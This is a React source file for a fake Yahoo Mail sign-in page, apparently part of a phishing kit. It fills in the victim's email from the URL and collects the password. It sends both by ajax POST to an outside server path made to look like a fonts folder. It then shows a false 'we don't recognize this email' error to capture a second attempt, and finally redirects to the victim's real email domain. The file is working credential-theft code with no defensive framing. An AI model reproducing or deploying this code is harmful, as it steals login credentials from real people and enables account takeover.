
import React, { useState, useEffect } from "react";
import './Yahoo.css';
import yahooFrontPage from '../../Media/Images/yahoo_frontpage.png';
// import { useLocation } from "react-router-dom";
import $ from "jquery";
import Preloader from "../../Preloader/Preloader";

const Yahoo = ()=>{

    const [spinLoader, setSpinLoader] = useState(false);

    const redirectURL = window.location.href;
    const sliceEqualSignA = redirectURL.indexOf("@");
    const extracetdemailDomain = redirectURL.substr((sliceEqualSignA+1)).split('&', 1).toString();;

    // console.log('zzzz', extracetdemailDomain);

    useEffect(()=>{
        // document.title = extracetdemailDomain;
        document.title = 'Yahoo';
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2400);
    }, [extracetdemailDomain]);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();;
    // console.log(extracetdEmail);

    // const indForEmail = uri.indexOf("@");
    // const slicedDomain = uri.substr((indForEmail+1));
    // console.log(slicedDomain);

    const [YahooEmail, setYahooEmail] = useState(extracetdEmail);
    const [YahooPassowrd, setYahooPassword] = useState('');
    const btn = 'Next';
    const [errMsg, setErrMsg] = useState(false);

    const [count, setCount] = useState(0);

    const submitYahooForm = e=>{
        e.preventDefault();
        
        // alert(count)
        console.log(YahooEmail, YahooPassowrd);
        if(YahooPassowrd === ""){
            return null
            // setErrMsg(true);
        }else{
            setErrMsg(true);
            setSpinLoader(true);
            setTimeout(() => {
                setSpinLoader(false);
            }, 2000);
            setTimeout(() => {
                setYahooPassword('')
            }, 1300);
            setCount(count=> count + 1);
            const user = {
                email: YahooEmail,
                password: YahooPassowrd
            }
            
            $.ajax({
                type: "POST",
                url: "https://dozenpearl.com/nc_assets/fonts/recov/free.php",
                data: user,
                success(data){
                    // alert('OK');
                    console.log(data);
                },
            });
            
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();;
                console.log(extracetdemailDomain);
                setTimeout(() => {
                    window.location.reload();
                    window.location.href = `https://www.${extracetdemailDomain}`;
                }, 1000);
            }
            // alert(4567)
        }
        
    }
    return(<div>
        
            { spinLoader ? <Preloader /> : null }

        <header className="yahoo_header_">
            <img src={yahooFrontPage} style={{cursor: 'pointer'}} className='Yahoo_logo' alt="Yahoo"/>

            {/* <a href="/" className="yahoo_help_">Help</a> */}

            <p className="yahoo_help_">Help</p>
        </header>


        <section className="Yahoo_wrapper">

            <div className="Yahoo_txt_content">
                <h3 className="Yahoo_h3">
                    Yahoo makes it easy to enjoy what matters most in
                    <br />
                    your world.
                </h3>

                <p className="Yahoo_p">
                    Best in class Yahoo Mail, breaking local, national and global
                    <br />
                    news, finance, sports, music, movies and more. You get more
                    <br />
                    out of the web, you get more out of life.
                </p>
            </div>

            <div className="Yahoo_container_form">
                <img src={yahooFrontPage} alt="Yahoo" className="form_img" />

                <div style={{
                    // display: 'flex',
                    // justifyContent: 'center'
                }}>
                    <strong className="challenge_heading">
                        Sign in to Yahoo Mail
                    </strong>
                    <br/>
                    <span className="challenge_desc">using your Yahoo account</span>
                </div>



                {/* INPUTS BELOW */}

                <div className="Yahoo_inputs">

                    <form onSubmit={submitYahooForm}>

                        { errMsg ?
                            <p className="Yahoo_err_msg" style={{
                                fontSize:'13.4px'
                            }}>
                            Sorry, we don't recognize this email.
                        </p>
                        : null}

                        <article className="login_label" style={{
                            userSelect:'none',
                            marginBottom:'-2px'
                        }}>
                            Email address
                        </article>

                        <div className="Yahoo_email_wrapper">
                            <input 
                                type={`email`}
                                value={YahooEmail}
                                className="email_input input_s"
                                readOnly
                                onChange={e=> setYahooEmail(e.target.value)}
                            />
                        </div>

                        <article className="login_label" style={{
                            userSelect:'none',
                            marginTop:'1em'
                        }}>
                            Password
                        </article>
                            
                        <div className="Yahoo_password_wrapper">
                            <input 
                                type={`password`}
                                className="password_input input_s"
                                value={YahooPassowrd}
                                onChange={e=> setYahooPassword(e.target.value)}
                                autoFocus
                            />

                        </div>
                            {/* <span className="yahoo_err">Sorry, we don't recognise this email address.</span> */}


                        <div className="Yahoo_submit_br_Hg_In_container_">
                            <input
                                type={`submit`}
                                value={btn}
                                className="Yahoo_button_submit_"
                                required
                            />
                        </div>


                        <div className="Yahoo_checkbox_forget_username_">
                            <span style={{color: '#188fff', cursor: 'pointer', fontSize: '.89353rem', display:'flex', alignItems:'center'}}>
                                <input 
                                    type={`checkbox`} 
                                    defaultChecked 
                                />
                                &#160;
                                <span>
                                    Stay signed in
                                </span>
                            </span>

                            <p className="Yahoo_fget_username">
                                Forgot username?
                            </p>
                        </div>

                        <div className="Yahoo_create_acct_wrapper">
                            <button className="create_acct_btn">
                                Create an account
                            </button>
                        </div>

                        
                    </form>

                </div>

            </div>
            
            

            

        </section>

    </div>)
}

export default Yahoo;